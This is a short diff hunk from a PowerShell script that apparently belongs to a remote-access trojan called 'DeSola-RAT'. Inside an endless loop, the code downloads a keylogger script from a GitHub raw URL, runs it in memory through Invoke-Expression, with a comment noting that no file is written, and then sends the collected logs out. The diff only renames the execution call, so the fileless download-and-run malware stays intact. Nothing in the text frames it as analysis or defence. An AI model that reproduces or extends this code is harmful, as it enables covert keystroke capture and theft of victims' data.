@@ -13,7 +13,7 @@ while ($true) {
         }
         # Execute keylogger in memory (no file)
         $code = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/p.ps1')
-        IEX $code
+        Invoke-Expression $code
         # Send logs
         Send-Logs
     }
